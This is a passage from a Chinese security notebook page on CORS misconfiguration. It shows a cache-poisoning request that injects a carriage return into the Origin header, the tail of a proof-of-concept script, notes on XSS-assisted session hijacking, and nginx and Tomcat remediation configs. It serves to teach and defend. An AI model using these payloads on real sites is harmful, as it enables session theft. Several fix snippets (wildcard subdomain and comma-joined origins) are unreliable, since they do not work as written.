<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">reqListener</span>(<span class="hljs-params"></span>) </span>{ 
    location=<span class="hljs-string">&apos;http://www.target.local/login&apos;</span>; 
}
</code></pre>
<h2 id="服务器端缓存中毒"><a name="服务器端缓存中毒" class="anchor-navigation-ex-anchor" href="#服务器端缓存中毒"><i class="fa fa-link" aria-hidden="true"></i></a>服务器端缓存中毒</h2>
<ul>
<li>利用 CORS 的错误配置注入任意 HTTP 头部，将其保存在服务器端缓存中，可用于构造存储类型 XSS。</li>
<li>利用条件：存在服务器端缓存，能够反射 <code>Origin</code> 头部，不会检查 <code>Origin</code> 头部中的特殊字符，如 <code>\r</code></li>
<li><p>利用方式：攻击 <code>IE / Edge</code> 用户（<code>IE / Edge</code> 使用 <code>\r</code> 作为的 HTTP 标题段的终结符）</p>
</li>
<li><p>请求包</p>
</li>
</ul>
<pre><code class="lang-http">GET / HTTP/1.1 
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
</code></pre>
<p>回车（CR）：ASCII 码：<code>&apos;\r&apos;</code> ，十六进制：<code>0x0d</code></p>
<ol>
<li>响应包</li>
</ol>
<pre><code class="lang-http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK 
<span class="hljs-attribute">Access-Control-Allow-Origin</span><span class="hljs-punctuation">: </span>z 
<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=UTF-7
</code></pre>
<p>如果攻击者能提前发送畸形的 <code>Origin</code> 消息头，则利用代理或命令行的方式发送，则服务器就会缓存这样的返回报文并作用于其他用户。上例中，攻击者将页面的编码设置为 <code>UTF-7</code>，可引发 XSS 中断。</p>
<h2 id="配合-xss-劫持会话"><a name="配合-xss-劫持会话" class="anchor-navigation-ex-anchor" href="#配合-xss-劫持会话"><i class="fa fa-link" aria-hidden="true"></i></a>配合 XSS 劫持会话</h2>
<p>在正常的网页被嵌入了到攻击者控制页面的跨域请求，从而劫持用户的会话。</p>
<ol>
<li><p>交互式 xss。通过 cors，绕过一些反会话劫持的方法，如 HTTP-Only 限制的 cookie，绑定 IP 地址的会话 ID 等，劫持用户会话。</p>
</li>
<li><p>程序猿在写 ajax 请求的时候，对目标域限制不严，有点类似于 url 跳转。</p>
<p>facebook 出现过这样一个案例，javascript 通过 url 里的参数进行 ajax 请求。
<img src="assets/CORS%20跨域漏洞-19.png" alt>​</p>
</li>
</ol>
<h1 id="0x05-修复方法"><a name="0x05-修复方法" class="anchor-navigation-ex-anchor" href="#0x05-修复方法"><i class="fa fa-link" aria-hidden="true"></i></a>0x05 修复方法</h1>
<p>修复方法是合理配置 CORS，判断 Origin 是否合法；具体说就是不让在 nginx 或 tomcat 中配置【Access-Control-Allow-Origin <code>*</code>​​​​​】或【Access-Control-Allow-Origin null​​​​​】。</p>
<ul>
<li>关闭非正式开启的 CORS，不要信任全部自身子域，减少攻击面</li>
<li>不要配置 Access-Control-Allow-Origin​​​ 为通配符 <code>*</code>​​​ 或 null​​​，严格校验来自请求数据包中 Origin​​​ 的值</li>
<li>彻底的返回 <code>Vary: Origin</code>​​​ 右边，突破攻击者利用浏览器缓存进行攻击</li>
<li>仅在接收到跨域请求时才配置有关于跨域的头部，并确保跨域请求是合法的源，以减少攻击者恶意利用的可能性</li>
<li>HTTPS 网站不要信任 HTTP 域</li>
</ul>
<pre><code class="lang-xml"># 允许跨域请求的域，* 代表所有；null 可以用来和本地 file 页面共享数据
add_header &apos;Access-Control-Allow-Origin&apos; *;

# 允许请求的 header
add_header &apos;Access-Control-Allow-Headers&apos; *;

# 允许带上 cookie 请求，不能和允许跨域请求的域 * 一同使用，Origin 需要明确的配置允许来源的域。因为 * 这种配置只能用于共享公开资源，对于共享公开资源，不应该需要身份认证。
add_header &apos;Access-Control-Allow-Credentials&apos; &apos;true&apos;;

# 允许请求的方法，比如 GET,POST,PUT,DELETE
add_header &apos;Access-Control-Allow-Methods&apos; *;
</code></pre>
<p><strong>修改 Nginx 配置文件</strong></p>
<h2 id="方法一：使用通配符-​​"><a name="方法一：使用通配符-​​" class="anchor-navigation-ex-anchor" href="#方法一：使用通配符-​​"><i class="fa fa-link" aria-hidden="true"></i></a>方法一：使用通配符 <code>*</code>​​</h2>
<pre><code class="lang-nginx"><span class="hljs-attribute">location</span> / {
    <span class="hljs-attribute">add_header</span> Access-Control-Allow-Origin <span class="hljs-regexp">*.xxx.com</span>;
    <span class="hljs-attribute">add_header</span> Access-Control-Allow-Headers <span class="hljs-string">&quot;Origin， X-Requested-With, Content-Type, Accept&quot;</span>;
    <span class="hljs-attribute">add_header</span> Access-Control-Allow-Methods <span class="hljs-string">&quot;GET, POST, OPTIONS&quot;</span>;
}
</code></pre>
<h2 id="方法二：指定域名白名单"><a name="方法二：指定域名白名单" class="anchor-navigation-ex-anchor" href="#方法二：指定域名白名单"><i class="fa fa-link" aria-hidden="true"></i></a>方法二：指定域名白名单</h2>
<p>根据错误配置类型，该方法有待确认。</p>
<pre><code class="lang-nginx"><span class="hljs-comment"># 使用域名</span>
<span class="hljs-attribute">location</span> / {
    <span class="hljs-attribute">add_header</span> Access-Control-Allow-Origin http://www.xixixi123.com;
    <span class="hljs-attribute">add_header</span> Access-Control-Allow-Headers <span class="hljs-string">&quot;Origin， X-Requested-With, Content-Type, Accept&quot;</span>;
    <span class="hljs-attribute">add_header</span> Access-Control-Allow-Methods <span class="hljs-string">&quot;GET, POST, OPTIONS&quot;</span>;
}

<span class="hljs-comment"># 指定 ip 与端口，可以逗号拼接</span>
<span class="hljs-attribute">location</span> / {
    <span class="hljs-attribute">add_header</span> Access-Control-Allow-Origin http://10.130.222.222:6500,http://10.130.222.223:6500;
    <span class="hljs-attribute">add_header</span> Access-Control-Allow-Headers <span class="hljs-string">&quot;Origin， X-Requested-With, Content-Type, Accept&quot;</span>;
    <span class="hljs-attribute">add_header</span> Access-Control-Allow-Methods <span class="hljs-string">&quot;GET, POST, OPTIONS&quot;</span>;
}
</code></pre>
<h2 id="方法三：使用正则表达式"><a name="方法三：使用正则表达式" class="anchor-navigation-ex-anchor" href="#方法三：使用正则表达式"><i class="fa fa-link" aria-hidden="true"></i></a>方法三：使用正则表达式</h2>
<pre><code class="lang-nginx"><span class="hljs-attribute">location</span> <span class="hljs-regexp">~ /myurl(.*)</span> {
    <span class="hljs-attribute">if</span> ( $http_origin <span class="hljs-regexp">~ &apos;^http(s)?://(localhost|10\.130\.222\.222):6500$&apos;</span> {
        <span class="hljs-attribute">add_header</span> Access-Control-Allow-Origin $http_origin;
    }
    <span class="hljs-attribute">if</span> ( $http_origin <span class="hljs-regexp">~ &apos;^http(s)?://(localhost|10\.130\.222\.223):6500$&apos;</span> {
        <span class="hljs-attribute">add_header</span> Access-Control-Allow-Origin $http_origin;
    }

    <span class="hljs-attribute">add_header</span> Access-Control-Allow-Headers <span class="hljs-string">&quot;Origin， X-Requested-With, Content-Type, Accept&quot;</span>;
    <span class="hljs-attribute">add_header</span> Access-Control-Allow-Methods <span class="hljs-string">&quot;GET, POST, OPTIONS&quot;</span>;
}
</code></pre>
<p><strong>说明</strong></p>
<ul>
<li><code>​$ http_origin</code>​​ 可以获取到请求头中的 Origin 字段；但是如果请求头没有，就获取不到了；</li>
<li><code>​^</code>​​ 是正则表达式，表示开头位置；$​​ 是正则表达式，表示结尾位置</li>
<li>​<code>?</code>​​ 是正则表达式，表示 s 可能有，也可能没有，这两种情况都可以匹配</li>
<li><code>.</code>​​​ 是把 <code>.</code>​​ 转义成普通字符的意思</li>
<li>nginx 中，if 后必须加空格，然后才能写 (​​，否则会报错；nginx 中，没有 else if</li>
<li>nginx 解决复杂请求跨域的时候需加上 aways 参数<br>eg：<code>add_header &apos;Access-Control-Allow-Origin&apos; &quot;$http_origin&quot; always;​​</code> 
原因：As of Nginx 1.7.5, add_header supports an &quot;always&quot; parameter which<br>​allows CORS to work if the backend returns 4xx or 5xx status code.​​<br>参考资料：<a href="https://gist.github.com/Stanback/7145487" target="_blank">https://gist.github.com/Stanback/7145487</a></li>
</ul>
<p><strong>白名单配置示例</strong></p>
<p><img src="assets/CORS%20跨域漏洞-20.png" alt></p>
<p><strong>Tomcat 过滤路由</strong></p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> filter;

<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.io.UnsupportedEncodingException;
<span class="hljs-keyword">import</span> java.security.MessageDigest;
<span class="hljs-keyword">import</span> java.security.NoSuchAlgorithmException;
<span class="hljs-keyword">import</span> java.util.Arrays;

<span class="hljs-keyword">import</span> javax.servlet.Filter;
<span class="hljs-keyword">import</span> javax.servlet.FilterChain;
<span class="hljs-keyword">import</span> javax.servlet.FilterConfig;
<span class="hljs-keyword">import</span> javax.servlet.ServletException;
<span class="hljs-keyword">import</span> javax.servlet.ServletRequest;
<span class="hljs-keyword">import</span> javax.servlet.ServletResponse;
<span class="hljs-keyword">import</span> javax.servlet.annotation.WebFilter;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;
<span class="hljs-keyword">import</span> javax.xml.ws.http.HTTPException;

<span class="hljs-meta">@WebFilter(&quot;/Cors&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CorsFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span> </span>{

    <span class="hljs-comment">/**
     * Default constructor.
     */</span>
    <span class="hljs-keyword">public</span> FilterConfig config;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">CorsFilter</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-comment">// TODO Auto-generated constructor stub</span>
    }

    <span class="hljs-comment">/**
     * <span class="hljs-doctag">@see</span> Filter#destroy()
     */</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-comment">// TODO Auto-generated method stub</span>
        <span class="hljs-keyword">this</span>.config = <span class="hljs-keyword">null</span>;
    }

    <span class="hljs-comment">/**
     * <span class="hljs-doctag">@see</span> Filter#doFilter(ServletRequest, ServletResponse, FilterChain)
     */</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException </span>{
        <span class="hljs-comment">//配置可信域名</span>
        String[] authhosts = {<span class="hljs-string">&quot;http://www.abc.com:8008&quot;</span>, <span class="hljs-string">&quot;http://www.abcyy.com&quot;</span>};
        String authost = <span class="hljs-string">&quot;&quot;</span>;
        HttpServletRequest httprequest = (HttpServletRequest) request;
        String origin = httprequest.getHeader(<span class="hljs-string">&quot;origin&quot;</span>);
        HttpServletResponse httpresponse = (HttpServletResponse) response;
        <span class="hljs-keyword">if</span> (origin != <span class="hljs-keyword">null</span> &amp;&amp; !Arrays.asList(authhosts).contains(origin)) {
            httpresponse.sendError(<span class="hljs-number">403</span>);
            <span class="hljs-keyword">return</span>;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; authhosts.length; i++) {
                <span class="hljs-keyword">if</span> (i != authhosts.length - <span class="hljs-number">1</span>) {
                    authost = authost + authhosts[i] + <span class="hljs-string">&quot;,&quot;</span>;
                } <span class="hljs-keyword">else</span> {
                    authost = authost + authhosts[i];
                }
            }
            httpresponse.addHeader(<span class="hljs-string">&quot;Access-Control-Allow-Origin&quot;</span>, authost);
            httpresponse.addHeader(<span class="hljs-string">&quot;Access-Control-Allow-Methods&quot;</span>,
                    <span class="hljs-string">&quot;GET, POST&quot;</span>);
            httpresponse.addHeader(<span class="hljs-string">&quot;Access-Control-Allow-Headers&quot;</span>,
                    <span class="hljs-string">&quot;origin, content-type, accept, x-requested-with, sid, mycustom, smuser&quot;</span>);
            chain.doFilter(request, response);
        }

    }


    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(FilterConfig arg0)</span> <span class="hljs-keyword">throws</span> ServletException </span>{
        <span class="hljs-comment">// TODO 自动生成的方法存根</span>
    }
}
</code></pre>
<p><strong>另一种配置方式</strong></p>
<ul>
<li>把 cors-filter-1.7.jar 与 java-property-utils-1.9.jar 这两个文件放到 tomcat 的 lib 目录下</li>
<li>在 tomcat 的 web.xml 中配置</li>
</ul>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>CORS<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>com.thetransactioncompany.cors.CORSFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>cors.allowOrigin<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- &lt;param-value&gt;*&lt;/param-value&gt; --&gt;</span>
    <span class="hljs-comment">&lt;!-- 允许访问的网站，多个时用逗号分隔，*代表允许所有 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>*.xxx.com,http://10.130.222.222:6500<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span> 
  <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>cors.exposedHeaders<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>Set-Cookie<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span> 
  <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>cors.supportsCredentials<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span> 
  <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>CORS<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">urlpattern</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span>
</code></pre>
<h1 id="0x00-前人栽树"><a name="0x00-前人栽树" class="anchor-navigation-ex-anchor" href="#0x00-前人栽树"><i class="fa fa-link" aria-hidden="true"></i></a>0x00 前人栽树</h1>
<ul>
<li><a href="https://www.ruanyifeng.com/blog/2016/04/cors.html" target="_blank">跨域资源共享 CORS 详解 - 阮一峰的网络日志 (ruanyifeng.com)</a> -- 可以顺便看看评论</li>
<li><a href="https://www.jianjunchen.com/post/cors%E5%AE%89%E5%85%A8%E9%83%A8%E7%BD%B2%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#contact" target="_blank">绕过浏览器 SOP，跨站窃取信息：CORS 配置安全漏洞报告及最佳部署实践 | Jianjun Chen | International Computer Science Institute | Network Security</a> -- 推荐阅读</li>
<li><a href="https://web.dev/cross-origin-resource-sharing/" target="_blank">https://web.dev/cross-origin-resource-sharing/</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" target="_blank">https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS</a></li>
<li>CVE-2018-8014，<a href="https://nvd.nist.gov/vuln/detail/CVE-2018-8014" target="_blank">https://nvd.nist.gov/vuln/detail/CVE-2018-8014</a></li>
<li><a href="https://segmentfault.com/a/1190000011145364" target="_blank">nginx - 前端常见跨域解决方案（全） - 个人文章 - SegmentFault 思否</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/83099266" target="_blank">CORS 介绍及其漏洞检测 - 知乎 (zhihu.com)</a></li>
<li><a href="https://www.cnblogs.com/wenyoudo/p/14862701.html" target="_blank">CORS 跨域漏洞修复 - 不愿透露姓名的汤姆猫 - 博客园 (cnblogs.com)</a></li>
<li><a href="https://blog.csdn.net/BHSZZY/article/details/119024992" target="_blank">(82 条消息) CORS(跨域资源共享)漏洞解决方法<em>cors 漏洞修复</em>追逐梦想永不停的博客-CSDN 博客</a> -- 测试方法说明有误</li>
<li><a href="https://www.cnblogs.com/gorillalee/p/14561896.html" target="_blank">【漏洞利用】跨域资源共享（CORS）漏洞详解 - GorillaLee - 博客园 (cnblogs.com)</a></li>
<li><a href="https://github.com/aszx87410/blog/issues/68" target="_blank">CORS 完全手冊（一）：為什麼會發生 CORS 錯誤？ · Issue #68 · aszx87410/blog · GitHub</a></li>
<li><a href="https://blog.csdn.net/qq_38011415/article/details/107095403#:~:text=Nginx%E8%B7%A8%E5%9F%9F%E9%85%8D%E7%BD%AE%201%201.%E4%BB%80%E4%B9%88%E6%98%AF%E8%B7%A8%E5%9F%9F%20%E7%94%B1%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%EF%BC%8C%E7%94%A8%E6%9D%A5%E9%99%90%E5%88%B6%E4%BB%8E%E4%B8%80%E4%B8%AA%E6%BA%90%E5%8A%A0%E8%BD%BD%E7%9A%84%E6%96%87%E6%A1%A3%E6%88%96%E8%84%9A%E6%9C%AC%E4%B8%8E%E6%9D%A5%E8%87%AA%E5%8F%A6%E4%B8%80%E4%B8%AA%E6%BA%90%E7%9A%84%E8%B5%84%E6%BA%90%E8%BF%9B%E8%A1%8C%E4%BA%A4%E4%BA%92%E3%80%82%20%E9%82%A3%E6%80%8E%E6%A0%B7%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%98%AF%E5%90%8C%E6%BA%90%E5%91%A2%EF%BC%9F%20%E5%A6%82%E6%9E%9C%E5%8D%8F%E8%AE%AE%EF%BC%8C%E7%AB%AF%E5%8F%A3%EF%BC%88%E5%A6%82%E6%9E%9C%E6%8C%87%E5%AE%9A%E4%BA%86%EF%BC%89%E5%92%8C%E4%B8%BB%E6%9C%BA%E5%AF%B9%E4%BA%8E%E4%B8%A4%E4%B8%AA%E9%A1%B5%E9%9D%A2%E6%98%AF%E7%9B%B8%E5%90%8C%E7%9A%84%EF%BC%8C%E5%88%99%E4%B8%A4%E4%B8%AA%E9%A1%B5%E9%9D%A2%E5%85%B7%E6%9C%89%E7%9B%B8%E5%90%8C%E7%9A%84%E6%BA%90%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E5%90%8C%E6%BA%90%E3%80%82%20...%202,%3B%20%E9%80%9A%E8%BF%87%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%20%3B%20...%205%205.%E9%99%84%E5%BD%95%205.1%E7%A4%BA%E4%BE%8B%E4%B8%ADNginx%E5%AE%8C%E6%95%B4%E9%85%8D%E7%BD%AE%20" target="_blank">(82 条消息) Nginx 跨域配置_程序员小强的博客-CSDN 博客</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/withCredentials" target="_blank">https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/withCredentials</a> </li>
</ul>
<footer class="page-footer"><span class="copyright">Copyright &amp; Copy zha0cai all right reserved，powered by Gitbook</span><span class="footer-modification">该文件修订时间：
2023-05-14 18:29:10
</span></footer></body></html>
                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="readme.html" class="navigation navigation-prev " aria-label="Previous page: Web">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="../email/readme.html" class="navigation navigation-next " aria-label="Next page: Email">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"tag":"WebSec","sticker":"1f41e","title":"CORS 跨域漏洞","level":"2.1.1","depth":2,"next":{"title":"Email","level":"4.1","depth":1,"path":"email/readme.md","ref":"email/readme.md","articles":[{"title":"Attack Email","level":"4.1.1","depth":2,"path":"email/Attack Email.md","ref":"email/Attack Email.md","articles":[]},{"title":"邮件协议","level":"4.1.2","depth":2,"path":"email/邮件协议.md","ref":"email/邮件协议.md","articles":[]}]},"previous":{"title":"Web","level":"2.1","depth":1,"path":"web/readme.md","ref":"web/readme.md","articles":[{"title":"CORS 跨域漏洞","level":"2.1.1","depth":2,"path":"web/CORS 跨域漏洞.md","ref":"web/CORS 跨域漏洞.md","articles":[]}]},"dir":"ltr"},"config":{"plugins":["versions-select","-lunr","-search","search-pro","highlight","code","theme-comscore","-splitter","-summary","anchor-navigation-ex","expandable-chapters","versions-select","tbfed-pagefooter","flexible-alerts","advanced-emoji","ace","chart","graph","katex","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"Copyright & Copy zha0cai","modify_label":"该文件修订时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"ace":{},"livereload":{},"search-pro":{},"code":{"copyButtons":true},"versions-select":{"type":"branches"},"graph":{},"katex":{},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"anchor-navigation-ex":{"showLevel":false,"associatedWithSummary":true,"mode":"float","showGoTop":true,"printLog":false,"multipleH1":true,"float":{"floatIcon":"fa fa-navicon","showLevelIcon":false,"level1Icon":"","level2Icon":"","level3Icon":""},"pageTop":{"showLevelIcon":false,"level1Icon":"","level2Icon":"","level3Icon":""}},"theme-comscore":{},"flexible-alerts":{"style":"callout","note":{"label":"Hinweis","icon":"fa fa-info-circle","className":"info"},"tip":{"label":"Tipp","icon":"fa fa-lightbulb-o","className":"tip"},"warning":{"label":"Warnung","icon":"fa fa-exclamation-triangle","className":"warning"},"danger":{"label":"Achtung","icon":"fa fa-ban","className":"danger"}},"versions":{"gitbookConfigURL":"book.json","options":[{"value":"https://zha0cai.github.io/gitbookPublic/home/","text":"Home Page","selected":true},{"value":"https://zha0cai.github.io/gitbookPublic/gitbook-security/","text":"Security Book","selected":true}]},"advanced-emoji":{"embedEmojis":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"chart":{"type":"c3"},"expandable-chapters":{}},"theme":"default","author":"zha0cai","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56},"embedFonts":false},"structure":{"langs":"LANGS.md","readme":"readme.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"zha0cai's Security Book","language":"zh-hans","links":{"sidebar":{"My github":"https://github.com/zha0cai"}},"gitbook":"*"},"file":{"path":"web/CORS 跨域漏洞.md","mtime":"2023-05-14T10:29:10.874Z","type":"markdown"},"gitbook":{"version":"4.0.0","time":"2023-05-14T12:34:39.659Z"},"basePath":"..","book":{"language":""}});
        });
    </script>
</div>

        
    <noscript>
        <style>
            .honkit-cloak {
                display: block !important;
            }
        </style>
    </noscript>
    <script>
        // Restore sidebar state as critical path for prevent layout shift
        function __init__getSidebarState(defaultValue){
            var baseKey = "";
            var key = baseKey + ":sidebar";
            try {
                var value = localStorage[key];
                if (value === undefined) {
                    return defaultValue;
                }
                var parsed = JSON.parse(value);
                return parsed == null ? defaultValue : parsed;
            } catch (e) {
                return defaultValue;
            }
        }
        function __init__restoreLastSidebarState() {
            var isMobile = window.matchMedia("(max-width: 600px)").matches;
            if (isMobile) {
                // Init last state if not mobile
                return;
            }
            var sidebarState = __init__getSidebarState(true);
            var book = document.querySelector(".book");
            // Show sidebar if it enabled
            if (sidebarState && book) {
                book.classList.add("without-animation", "with-summary");
            }
        }

        try {
            __init__restoreLastSidebarState();
        } finally {
            var book = document.querySelector(".book");
            book.classList.remove("honkit-cloak");
        }
    </script>
    <script src="../gitbook/gitbook.js"></script>
    <script src="../gitbook/theme.js"></script>
    
        
        <script src="../gitbook/gitbook-plugin-versions-select/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search-pro/jquery.mark.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search-pro/search.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-code/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-versions-select/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-flexible-alerts/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-ace/ace/ace.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-ace/ace.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-livereload/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-theme-comscore/test.js"></script>
        
    

    </body>
</html>

